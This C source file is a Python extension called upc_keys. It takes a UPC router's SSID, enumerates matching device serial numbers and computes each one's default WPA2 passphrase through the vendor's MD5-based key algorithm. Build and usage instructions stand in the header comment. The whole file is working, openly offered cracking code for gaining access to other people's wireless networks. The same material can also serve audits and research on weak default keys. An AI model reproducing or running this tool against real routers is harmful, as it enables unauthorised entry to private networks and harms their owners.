/*
 * upc_keys.c -- WPA2 passphrase recovery tool for UPC%07d devices
 * ====================================================================
 * Modified version - Python bindings by dsc <sander@cedsys.nl> 1-1-2016
 * Original: https://haxx.in/upc_keys.c by blasty <peter@haxx.in> 31-12-2015
 *
 * Manual install:
 * apt-get install python2.7-dev
 * gcc -fPIC -shared -I/usr/include/python2.7 -lcrypto upc_keys.c -o upc_keys.so && sudo cp upc_keys.so /usr/lib/python2.7/
 *
 * >>> from upc_keys import crack
 * >>> crack("UPC11111")
 * [{'serial': 'SAAP03688711', 'pass': 'QGVGHMEU'}, {'serial': 'SAAP03...
*/

#include <Python.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/md5.h>
 
#define MAGIC_24GHZ 0xffd9da60
#define MAGIC_5GHZ 0xff8d8f20
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 99
#define MAX2 9
#define MAX3 9999

void hash2pass(uint8_t *in_hash, char *out_pass)
{
    uint32_t i, a;

    for (i = 0; i < 8; i++) {
        a = in_hash[i] & 0x1f;
        a -= ((a * MAGIC0) >> 36) * 23;

        a = (a & 0xff) + 0x41;

        if (a >= 'I') a++;
        if (a >= 'L') a++;
        if (a >= 'O') a++;

        out_pass[i] = a;
    }
    out_pass[8] = 0;
}

uint32_t mangle(uint32_t *pp)
{
    uint32_t a, b;

    a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
    b = (pp[3] - a * 9999 + 1) * 11ll;

    return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
    uint32_t a, b;

    a = data[1] * 10 + data[2];
    b = data[0] * 2500000 + a * 6800 + data[3] + magic;

    return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
}

static PyObject *upc_keys_crack(PyObject *self, PyObject *args)
{
    const char *ssid;

    if (!PyArg_ParseTuple(args, "s", &ssid))
        return NULL;

    uint32_t buf[4], target;
    char serial[64];
    char pass[9], tmpstr[17];
    uint8_t h1[16], h2[16];
    uint32_t hv[4], w1, w2, i, cnt=0;

    target = strtoul(ssid + 3, NULL, 0);

    MD5_CTX ctx;
    PyObject *list = PyList_New(0);

    for (buf[0] = 0; buf[0] <= MAX0; buf[0]++)
    for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
    for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
    for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
        if(upc_generate_ssid(buf, MAGIC_24GHZ) != target &&
            upc_generate_ssid(buf, MAGIC_5GHZ) != target) {
            continue;
        }

        cnt++;

        sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

        MD5_Init(&ctx);
        MD5_Update(&ctx, serial, strlen(serial));
        MD5_Final(h1, &ctx);

        for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t *)(h1 + i*2);
        }

        w1 = mangle(hv);

        for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t *)(h1 + 8 + i*2);
        }

        w2 = mangle(hv);

        sprintf(tmpstr, "%08X%08X", w1, w2);

        MD5_Init(&ctx);
        MD5_Update(&ctx, tmpstr, strlen(tmpstr));
        MD5_Final(h2, &ctx);

        hash2pass(h2, pass);

        PyList_Append(list, Py_BuildValue("{ssss}", "serial", serial, "pass", pass));
    }

    return list;
}

static PyMethodDef upc_keys_methods[] = {
        { "crack", (PyCFunction)upc_keys_crack, METH_VARARGS, NULL },
        { NULL, NULL, 0, NULL }
};

PyMODINIT_FUNC initupc_keys()
{
        Py_InitModule3("upc_keys", upc_keys_methods, NULL);
}